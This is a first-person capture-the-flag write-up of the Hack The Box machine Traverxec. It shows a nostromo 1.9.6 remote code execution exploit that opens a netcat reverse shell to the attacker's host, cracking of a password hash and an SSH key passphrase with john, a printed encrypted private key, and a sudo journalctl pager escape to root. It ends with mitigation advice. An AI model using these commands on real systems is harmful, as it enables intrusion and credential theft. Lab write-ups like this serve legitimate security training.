# Traverxec

```
root@kali:/home/kali/htb/Traverxec# nmap -p- -sC -sV 10.129.1.193
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-14 12:56 EDT
Nmap scan report for 10.129.1.193
Host is up (0.030s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 113.17 seconds

```


I go to the webpage and see that it is created with TemplateMag. I can't find any /admin/ page or anything like that.

I also see that it is created with nostromo, so I searchsploit that too.


```
root@kali:/home/kali/htb/Traverxec# searchsploit TemplateMag
Exploits: No Results
Shellcodes: No Results
root@kali:/home/kali/htb/Traverxec# searchsploit nostromo
--------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                             |  Path
--------------------------------------------------------------------------- ---------------------------------
Nostromo - Directory Traversal Remote Command Execution (Metasploit)       | multiple/remote/47573.rb
nostromo 1.9.6 - Remote Code Execution                                     | multiple/remote/47837.py
nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Execution       | linux/remote/35466.sh
--------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
root@kali:/home/kali/htb/Traverxec# 
```

The RCE looks good:

```
root@kali:/home/kali/htb/Traverxec# python 47837.py 10.129.1.193 80 "nc -e /bin/bash 10.10.14.20 1337"


                                        _____-2019-16278
        _____  _______    ______   _____\    \   
   _____\    \_\      |  |      | /    / |    |  
  /     /|     ||     /  /     /|/    /  /___/|  
 /     / /____/||\    \  \    |/|    |__ |___|/  
|     | |____|/ \ \    \ |    | |       \        
|     |  _____   \|     \|    | |     __/ __     
|\     \|\    \   |\         /| |\    \  /  \    
| \_____\|    |   | \_______/ | | \____\/    |   
| |     /____/|    \ |     | /  | |    |____/|   
 \|_____|    ||     \|_____|/    \|____|   | |   
        |____|/                        |___|/    




^CHTTP/1.1 200 OK
Date: Sun, 14 Mar 2021 17:11:37 GMT
Server: nostromo 1.9.6
Connection: close

root@kali:/home/kali/htb/Traverxec# 

```

And on the listener:


```
root@kali:/home/kali/htb/Traverxec# nc -nlvp 1337
Listening on 0.0.0.0 1337
Connection received on 10.129.1.193 58966
whomi 
whoami
www-data
script /dev/null -c bash
Script started, file is /dev/null
www-data@traverxec:/usr/bin$ ^Z
[1]+  Stopped                 nc -nlvp 1337
root@kali:/home/kali/htb/Traverxec# stty -raw echo
root@kali:/home/kali/htb/Traverxec# fg
nc -nlvp 1337
reset
reset
reset: unknown terminal type unknown
Terminal type? xterm
xterm


www-data@traverxec:/usr/bin$ export TERM=xterm
export TERM=xterm
www-data@traverxec:/usr/bin$ export SHELL=bash
export SHELL=bash
www-data@traverxec:/usr/bin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@traverxec:/usr/bin$ sudo -l
sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for www-data: 

Sorry, try again.
[sudo] password for www-data: 

Sorry, try again.
[sudo] password for www-data: 

sudo: 3 incorrect password attempts
www-data@traverxec:/usr/bin$ 
```


I do not have permission to enter /home/david, but in the /var/nostromo/conf folder I find some interesting stuff:

```
www-data@traverxec:/var/nostromo/conf$ ls -la
ls -la
total 20
drwxr-xr-x 2 root daemon 4096 Oct 27  2019 .
drwxr-xr-x 6 root root   4096 Oct 25  2019 ..
-rw-r--r-- 1 root bin      41 Oct 25  2019 .htpasswd
-rw-r--r-- 1 root bin    2928 Oct 25  2019 mimes
-rw-r--r-- 1 root bin     498 Oct 25  2019 nhttpd.conf
www-data@traverxec:/var/nostromo/conf$ cat .htpasswd
cat .htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
www-data@traverxec:/var/nostromo/conf$ 

```


This can probably be cracked with john:


```
root@kali:/home/kali/htb/Traverxec# john hash -wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Nowonly4me       (david)
1g 0:00:00:30 DONE (2021-03-14 13:16) 0.03259g/s 344798p/s 344798c/s 344798C/s Noyoudo..Nous4=5
Use the "--show" option to display all of the cracked passwords reliably
Session completed
root@kali:/home/kali/htb/Traverxec# 
```

This did not work anywhere however. So I have to do some more digging.

```
www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf
cat nhttpd.conf
# MAIN [MANDATORY]

servername              traverxec.htb
serverlisten            *
serveradmin             david@traverxec.htb
serverroot              /var/nostromo
servermimes             conf/mimes
docroot                 /var/nostromo/htdocs
docindex                index.html

# LOGS [OPTIONAL]

logpid                  logs/nhttpd.pid

# SETUID [RECOMMENDED]

user                    www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess                .htaccess
htpasswd                /var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons                  /var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www
www-data@traverxec:/var/nostromo/conf$ 
```

We see the basic authentication uses that file I found. The homedirs is /home. And the public one is then /home/public_www? No, I already checked the home directory.

so it may be /home/david/public_www, giving us access to the home folder?

```
www-data@traverxec:/var/nostromo/conf$ ls -la /home
ls -la /home
total 12
drwxr-xr-x  3 root  root  4096 Oct 25  2019 .
drwxr-xr-x 18 root  root  4096 Oct 25  2019 ..
drwx--x--x  5 david david 4096 Oct 25  2019 david
www-data@traverxec:/var/nostromo/conf$ ls -la /home/david/public_www
ls -la /home/david/public_www
total 16
drwxr-xr-x 3 david david 4096 Oct 25  2019 .
drwx--x--x 5 david david 4096 Oct 25  2019 ..
-rw-r--r-- 1 david david  402 Oct 25  2019 index.html
drwxr-xr-x 2 david david 4096 Oct 25  2019 protected-file-area
www-data@traverxec:/var/nostromo/conf$ ls -la /home/david/public_www/..
ls -la /home/david/public_www/..
ls: cannot open directory '/home/david/public_www/..': Permission denied
www-data@traverxec:/var/nostromo/conf$ ls -la /home/david/public_www/protected-file-area
<$ ls -la /home/david/public_www/protected-file-area
total 16
drwxr-xr-x 2 david david 4096 Oct 25  2019 .
drwxr-xr-x 3 david david 4096 Oct 25  2019 ..
-rw-r--r-- 1 david david   45 Oct 25  2019 .htaccess
-rw-r--r-- 1 david david 1915 Oct 25  2019 backup-ssh-identity-files.tgz
www-data@traverxec:/var/nostromo/conf$ cat /home/david/public_www/protected-file-area/.htaccess               
<ome/david/public_www/protected-file-area/.htaccess 
realm David's Protected File Area. Keep out!
www-data@traverxec:/var/nostromo/conf$ 
```

we have a backup ssh file:


```
www-data@traverxec:/tmp$ cp /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz .
<protected-file-area/backup-ssh-identity-files.tgz .
www-data@traverxec:/tmp$ ls -la
ls -la
total 44
drwxrwxrwt 10 root     root     4096 Mar 14 14:21 .
drwxr-xr-x 18 root     root     4096 Oct 25  2019 ..
drwxrwxrwt  2 root     root     4096 Mar 14 12:39 .ICE-unix
drwxrwxrwt  2 root     root     4096 Mar 14 12:39 .Test-unix
drwxrwxrwt  2 root     root     4096 Mar 14 12:39 .X11-unix
drwxrwxrwt  2 root     root     4096 Mar 14 12:39 .XIM-unix
drwxrwxrwt  2 root     root     4096 Mar 14 12:39 .font-unix
-rw-r--r--  1 www-data www-data 1915 Mar 14 14:21 backup-ssh-identity-files.tgz
drwx------  3 root     root     4096 Mar 14 12:39 systemd-private-d60b6fb8389a46e1bc4d6aceba7399f9-systemd-timesyncd.service-qLwn4O
drwx------  2 root     root     4096 Mar 14 12:39 vmware-root
drwx------  2 root     root     4096 Mar 14 12:39 vmware-root_525-4281712298
www-data@traverxec:/tmp$ tar zxvf backup-ssh-identity-files.tgz
tar zxvf backup-ssh-identity-files.tgz
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub
www-data@traverxec:/tmp$ cd home/david/.ssh
cd home/david/.ssh
www-data@traverxec:/tmp/home/david/.ssh$ ls -la
ls -la
total 20
drwx------ 2 www-data www-data 4096 Oct 25  2019 .
drwxr-xr-x 3 www-data www-data 4096 Mar 14 14:22 ..
-rw-r--r-- 1 www-data www-data  397 Oct 25  2019 authorized_keys
-rw------- 1 www-data www-data 1766 Oct 25  2019 id_rsa
-rw-r--r-- 1 www-data www-data  397 Oct 25  2019 id_rsa.pub
www-data@traverxec:/tmp/home/david/.ssh$ cat id_rsa
cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,477EEFFBA56F9D283D349033D5D08C4F

seyeH/feG19TlUaMdvHZK/2qfy8pwwdr9sg75x4hPpJJ8YauhWorCN4LPJV+wfCG
tuiBPfZy+ZPklLkOneIggoruLkVGW4k4651pwekZnjsT8IMM3jndLNSRkjxCTX3W
KzW9VFPujSQZnHM9Jho6J8O8LTzl+s6GjPpFxjo2Ar2nPwjofdQejPBeO7kXwDFU
RJUpcsAtpHAbXaJI9LFyX8IhQ8frTOOLuBMmuSEwhz9KVjw2kiLBLyKS+sUT9/V7
HHVHW47Y/EVFgrEXKu0OP8rFtYULQ+7k7nfb7fHIgKJ/6QYZe69r0AXEOtv44zIc
Y1OMGryQp5CVztcCHLyS/9GsRB0d0TtlqY2LXk+1nuYPyyZJhyngE7bP9jsp+hec
dTRqVqTnP7zI8GyKTV+KNgA0m7UWQNS+JgqvSQ9YDjZIwFlA8jxJP9HsuWWXT0ZN
6pmYZc/rNkCEl2l/oJbaJB3jP/1GWzo/q5JXA6jjyrd9xZDN5bX2E2gzdcCPd5qO
xwzna6js2kMdCxIRNVErnvSGBIBS0s/OnXpHnJTjMrkqgrPWCeLAf0xEPTgktqi1
Q2IMJqhW9LkUs48s+z72eAhl8naEfgn+fbQm5MMZ/x6BCuxSNWAFqnuj4RALjdn6
i27gesRkxxnSMZ5DmQXMrrIBuuLJ6gHgjruaCpdh5HuEHEfUFqnbJobJA3Nev54T
fzeAtR8rVJHlCuo5jmu6hitqGsjyHFJ/hSFYtbO5CmZR0hMWl1zVQ3CbNhjeIwFA
bzgSzzJdKYbGD9tyfK3z3RckVhgVDgEMFRB5HqC+yHDyRb+U5ka3LclgT1rO+2so
uDi6fXyvABX+e4E4lwJZoBtHk/NqMvDTeb9tdNOkVbTdFc2kWtz98VF9yoN82u8I
Ak/KOnp7lzHnR07dvdD61RzHkm37rvTYrUexaHJ458dHT36rfUxafe81v6l6RM8s
9CBrEp+LKAA2JrK5P20BrqFuPfWXvFtROLYepG9eHNFeN4uMsuT/55lbfn5S41/U
rGw0txYInVmeLR0RJO37b3/haSIrycak8LZzFSPUNuwqFcbxR8QJFqqLxhaMztua
4mOqrAeGFPP8DSgY3TCloRM0Hi/MzHPUIctxHV2RbYO/6TDHfz+Z26ntXPzuAgRU
/8Gzgw56EyHDaTgNtqYadXruYJ1iNDyArEAu+KvVZhYlYjhSLFfo2yRdOuGBm9AX
JPNeaxw0DX8UwGbAQyU0k49ePBFeEgQh9NEcYegCoHluaqpafxYx2c5MpY1nRg8+
XBzbLF9pcMxZiAWrs4bWUqAodXfEU6FZv7dsatTa9lwH04aj/5qxEbJuwuAuW5Lh
hORAZvbHuIxCzneqqRjS4tNRm0kF9uI5WkfK1eLMO3gXtVffO6vDD3mcTNL1pQuf
SP0GqvQ1diBixPMx+YkiimRggUwcGnd3lRBBQ2MNwWt59Rri3Z4Ai0pfb1K7TvOM
j1aQ4bQmVX8uBoqbPvW0/oQjkbCvfR4Xv6Q+cba/FnGNZxhHR8jcH80VaNS469tt
VeYniFU/TGnRKDYLQH2x0ni1tBf0wKOLERY0CbGDcquzRoWjAmTN/PV2VbEKKD/w
-----END RSA PRIVATE KEY-----
www-data@traverxec:/tmp/home/david/.ssh$        
```

I copy this to a file and run john on it:

```
root@kali:/home/kali/htb/Traverxec# locate ssh2john
/home/kali/JohnTheRipper/run/ssh2john.py
/opt/JohnTheRipper/run/ssh2john.py
/usr/share/john/ssh2john.py
root@kali:/home/kali/htb/Traverxec# /opt/JohnTheRipper/run/ssh2john.py hash2 > hash_john
root@kali:/home/kali/htb/Traverxec# john hash_john -wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (hash2)
1g 0:00:00:03 77.09% (ETA: 14:25:05) 0.3333g/s 3682Kp/s 3682Kc/s 3682KC/s JH71379!..JH1906
Session aborted
root@kali:/home/kali/htb/Traverxec# chmod 400 hash2
root@kali:/home/kali/htb/Traverxec# ssh -i hash2 david@10.129.1.193
Enter passphrase for key 'hash2': 
X11 forwarding request failed on channel 0
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
david@traverxec:~$ id
uid=1000(david) gid=1000(david) groups=1000(david),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
david@traverxec:~$ 
```

And I use the id_rsa file to ssh in with `hunter` as the passphrase.

In the home directory we find a folder called bin, with some files in it:


```
david@traverxec:~/bin$ ls -la
total 16
drwx------ 2 david david 4096 Oct 25  2019 .
drwx--x--x 5 david david 4096 Oct 25  2019 ..
-r-------- 1 david david  802 Oct 25  2019 server-stats.head
-rwx------ 1 david david  363 Oct 25  2019 server-stats.sh

david@traverxec:~/bin$ cat server-stats.sh 
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
david@traverxec:~/bin$ cat server-stats.head
                                                                          .----.
                                                              .---------. | == |
   Webserver Statistics and Data                              |.-"""""-.| |----|
         Collection Script                                    ||       || | == |
          (c) David, 2019                                     ||       || |----|
                                                              |'-.....-'| |::::|
                                                              '"")---(""' |___.|
                                                             /:::::::::::\"    "
                                                            /:::=======:::\
                                                        jgs '"""""""""""""' 

david@traverxec:~/bin$
```

I assume the privesc has something to do with this file.

I looked for writing permissions in /usr/local/bin to maybe make an echo file since it's not called with a fixed path. But I don't.

I search for the other binaries in https://gtfobins.github.io/

and I find https://gtfobins.github.io/gtfobins/journalctl/

As we can see in the script, it is being ran as sudo. And we can break out from the less reader, just like in vim.

So if we run `/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat`

We will get an error message:

```
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
-- Logs begin at Sun 2021-03-14 12:39:23 EDT, end at Sun 2021-03-14 15:08:12 EDT. --
Mar 14 13:12:39 traverxec sudo[846]: www-data : command not allowed ; TTY=pts/0 ; PWD=/usr/bin ; USER=root ; COMMAND=list
Mar 14 13:17:02 traverxec su[874]: pam_unix(su:auth): authentication failure; logname= uid=33 euid=0 tty=pts/0 ruser=www-data rhost=  user=david
Mar 14 13:17:04 traverxec su[874]: FAILED SU (to david) www-data on pts/0
Mar 14 14:25:56 traverxec su[1067]: pam_unix(su:auth): authentication failure; logname= uid=33 euid=0 tty=pts/0 ruser=www-data rhost=  user=david
Mar 14 14:25:57 traverxec su[1067]: FAILED SU (to david) www-data on pts/0
david@traverxec:~/bin$ 
```

But if we remove the `| /usr/bin/cat` ending, we get this:

```
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Sun 2021-03-14 12:39:23 EDT, end at Sun 2021-03-14 15:08:58 EDT. --
Mar 14 13:12:39 traverxec sudo[846]: www-data : command not allowed ; TTY=pts/0 ; PWD=/usr/bin ; USER=root ; COMMAND=list
Mar 14 13:17:02 traverxec su[874]: pam_unix(su:auth): authentication failure; logname= uid=33 euid=0 tty=pts/0 ruser=www-data
Mar 14 13:17:04 traverxec su[874]: FAILED SU (to david) www-data on pts/0
Mar 14 14:25:56 traverxec su[1067]: pam_unix(su:auth): authentication failure; logname= uid=33 euid=0 tty=pts/0 ruser=www-dat
Mar 14 14:25:57 traverxec su[1067]: FAILED SU (to david) www-data on pts/0
lines 1-6/6 (END)
```

We can then type in `!/bin/bash` or `!/bin/sh` just like in vim to break out into a root shell, since it is ran sudo:


```
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Sun 2021-03-14 12:39:23 EDT, end at Sun 2021-03-14 15:08:58 EDT. --
Mar 14 13:12:39 traverxec sudo[846]: www-data : command not allowed ; TTY=pts/0 ; PWD=/usr/bin ; USER=root ; COMMAND=list
Mar 14 13:17:02 traverxec su[874]: pam_unix(su:auth): authentication failure; logname= uid=33 euid=0 tty=pts/0 ruser=www-data
Mar 14 13:17:04 traverxec su[874]: FAILED SU (to david) www-data on pts/0
Mar 14 14:25:56 traverxec su[1067]: pam_unix(su:auth): authentication failure; logname= uid=33 euid=0 tty=pts/0 ruser=www-dat
Mar 14 14:25:57 traverxec su[1067]: FAILED SU (to david) www-data on pts/0
!/bin/bash
root@traverxec:/home/david/bin# whoami
root
root@traverxec:/home/david/bin# 
```

GTFOBins is a collection of common binaries that can be used to escalate privileges or gain shells. 


## Comparing myself with the official writeup:

They find the nostromo exploit after visiting the website and get access,

They find the nostromo configuration folder along with the creds in it. And then find the folder in david's home directory.

They try the ssh id, but need a password. So they crack it with john and get access as david.

After finidng the shell file they find then journalctl command, and know that invokes the default pager, less. 

They then get root.



## How to stop this exploit:

Updating the nostromo version should stop the exploit.

Saving backup ssh creds is a bad idea. As we could see here. Even if the directory is nested in a directory with no permisson. The directory is still acessible with a fixed path.

Journalctl had sudo permissions, this is a major security risk and unnecessary.

